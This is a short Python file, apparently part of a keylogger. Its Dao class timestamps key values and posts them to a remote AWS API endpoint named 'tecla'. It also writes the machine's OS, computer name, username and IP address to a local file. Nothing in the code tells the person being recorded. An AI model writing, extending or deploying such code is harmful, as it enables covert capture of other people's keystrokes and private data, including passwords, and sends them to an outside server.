import csv
import time, datetime
import requests
from datos_computador import *
class Dao:
    apiUrl = "https://qm2skcyyr8.execute-api.sa-east-1.amazonaws.com/prueba/tecla"
    fecha_inicio_lectura = datetime.datetime.now()
    @staticmethod
    def sendData(valor):
        hora_presionada = datetime.datetime.now().strftime("%y-%m-%d %H:%M:%S")
        print(hora_presionada)
        Dao.postData(hora_presionada, valor)
                                 
                
    @staticmethod
    def postData(hora_presionada, valor):
        try:
            requests.post(Dao.apiUrl, json={'hora_presionada': hora_presionada, 'valor': valor})
            print("enviado")
        except:
            print("error")

    @staticmethod
    def getDatosComputador():
        with open("c:\\datos\\datosComputador.txt", "w") as file:
            file.write("Datos del computador:\n")
            file.write("Sistema operativo: "+ DatosComputador.getIdSistemaOperativo()+"\n")
            file.write("Arquitectura: "+ DatosComputador.getArquitectura()+"\n")
            file.write("Nombre del computador: "+ DatosComputador.getNompreComputador()+"\n")
            file.write("Nombre de usuario: "+ DatosComputador.getNombreUsuario()+"\n")
            file.write("Ip: "+ DatosComputador.getIp()+"\n")
